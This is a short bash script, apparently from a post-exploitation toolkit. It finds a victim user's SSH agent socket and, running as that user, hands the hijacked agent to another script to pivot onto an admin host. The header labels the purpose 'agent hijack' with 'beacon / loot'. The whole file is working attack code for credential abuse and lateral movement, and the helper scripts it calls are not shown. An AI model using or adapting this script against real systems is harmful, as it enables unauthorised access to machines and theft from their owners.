#!/usr/bin/env bash
# Agent hijack → post_pivot_admin_host.sh (beacon / loot).
# Usage: sudo ./post_pivot_via_agent.sh <ADMIN_IP> [admin_ssh_port]
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib.sh
source "$DIR/lib.sh"

ADMIN_IP="${1:-}"
[[ -n "$ADMIN_IP" ]] || { echo "Usage: $0 <ADMIN_IP> [admin_ssh_port]"; exit 1; }

export VICTIM_USER="${VICTIM_USER:-legacy}"
export LOOT_DIR="${LOOT_DIR:-/tmp}"
AUTH_SOCK="$(find_agent_sock)" || { echo "[-] No agent for ${VICTIM_USER}"; exit 1; }

runuser -u "$VICTIM_USER" -- env SSH_AUTH_SOCK="$AUTH_SOCK" \
  "$DIR/post_pivot_admin_host.sh" "$ADMIN_IP" "${2:-22}"